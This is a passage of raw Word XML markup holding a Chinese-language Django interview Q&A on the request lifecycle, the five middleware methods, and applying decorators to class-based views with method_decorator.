      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>post,</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>体现在</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>之中</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DCEBC5C"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url</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>经过</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>wsgi,</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>再经过</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的中间件</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最后</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>到过路由映射表</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在路由中一条一条进行匹配</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>一旦其中一条匹配成功就执行对应的视图函数</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后面的路由就不再继续匹配了</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F1CF196"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lastRenderedPageBreak/>
        <w:t>视图函数根据客户端的请求查询相应的数据</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返回给</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django,</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>然后</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>把客户端想要的数据做为一个字符串返回给客户端</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546CCB00"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客户端浏览器接收到返回的数据</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经过渲染后显示给用户</w:t>
      </w:r>
      <w:r w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB4B216" w14:textId="43424078"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hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>18</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列举</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中间件的</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>个方法</w:t>
      </w:r>
      <w:r w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B20F631" w14:textId="1E73E006" w:rsidR="00191162" w:rsidRPr="00267D1E" w:rsidRDefault="00267D1E"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1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">process_request : </w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求进来时</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>权限认证</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A91ADE9" w14:textId="2394CC71" w:rsidR="00191162" w:rsidRPr="00267D1E" w:rsidRDefault="00267D1E"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2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">process_view : </w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>路由匹配之后</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>能够得到视图函数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C9A413" w14:textId="39198875" w:rsidR="00191162" w:rsidRPr="00267D1E" w:rsidRDefault="00267D1E"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3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">process_exception : </w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>异常时执行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA86456" w14:textId="3931731A" w:rsidR="00191162" w:rsidRPr="00267D1E" w:rsidRDefault="00267D1E"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4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">process_template_response : </w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模板渲染时执行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A1E25C3" w14:textId="52D464F2" w:rsidR="00191162" w:rsidRPr="00267D1E" w:rsidRDefault="00267D1E"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5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">process_response : </w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="00267D1E">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求有响应时执行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F43539F" w14:textId="25F3E256"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b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>020</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如何给</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CBV</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的程序添加装饰器</w:t>
      </w:r>
      <w:r w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D1A06DE"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770088"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>utils</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>decorators</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="770088"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>import</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>method_decorator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32FC666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AA5500"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t># 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA5500"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>、给方法加：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41AD748F"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A9243D2"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post</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="0055AA"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>self</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02BC5324"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A9FF0D3"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AA5500"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t># 2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA5500"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>、给</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA5500"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>dispatch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA5500"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>加：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF2116E"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="597DB397"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dispatch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="0055AA"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>self</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>request</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args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kwargs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A5E0B8F"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23720CD1"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AA5500"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t># 3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA5500"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>、给类加：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BDA162"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 xml:space="preserve">, </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"get"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394427A1"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 xml:space="preserve">, </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"post"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
